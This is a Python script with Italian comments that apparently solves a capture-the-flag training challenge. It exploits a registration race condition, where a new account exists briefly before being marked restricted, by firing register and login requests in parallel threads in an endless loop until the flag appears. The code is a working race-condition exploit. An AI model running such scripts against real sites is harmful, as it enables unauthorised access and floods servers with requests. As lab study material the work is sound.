'''
Nella login page se lo user è restricted stampa: 'This is a restricted account',
altrimenti se non è restricted stampa il flag.
Quindi il nostro obiettivo è fare login come un non restricted user.
Nella pagina di registrazione vediamo che quando viene creato un utente prima vengono inseriti nel db i parametri di user e password,
poi quell'utente viene settato con il parametro isRestricted a TRUE.
Quindi viene prima creato l'utente e poi fatta la resitrizione: c'è un inconsistent state in cui l'utente non è restricted (il nostro attacco deve sfruttare
proprio questo)
Il nostro exploit sarà di registrarsi e poi loggarsi con l'utente prima che venga settato come restricted (così stamperà il flag nella pagina di login) e 
per fare questo usiamo due Thread (uno per registrarsi e uno per loggarsi) e li facciamo andare in parallelo
'''
import requests
import random
import string
import threading
import time

baseurl = "http://aart.training.jinblack.it" 

def randomString(n=10):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(n))


def login(session,username, password):
    url = "%s/login.php" % baseurl
    data = {"username": username, "password": password} # I data (username e password) li vedo su ispeziona elemento -> rete -> login.php -> header (e i dati sono su dati richiesta, ovviamente devo inviarli per vederli facendo login con user e password)  
    r = session.post(url, data=data)
    if "flag" in r.text:
        print(r.text)
    return r.text

def register(session, username, password):
    url = "%s/register.php" % baseurl
    data = {"username": username, "password": password}
    r = session.post(url, data=data)
    return r.text

while True:                 # Facciamo il loop fino a che non otteniamo il flag (perchè a volte dà NULL invece del flag)
    s = requests.Session()
    u = randomString()
    p = randomString()

    t1 = threading.Thread(target=register, args=(s,u,p)) # Nel target va la funzione e in args gli argomenti della funzione
    t2 = threading.Thread(target=login, args=(s,u,p))

    t1.start()
    t2.start() 

    #register(s,u,p)
    #login(s,u,p)

    print(u,p)

    t1.join() # Il join aspetta che i due subthread finiscano (sennò il main thread muore prima che i due subthread finiscano e quindi non vediamo niente)
    t2.join()
    time.sleep(0.1)
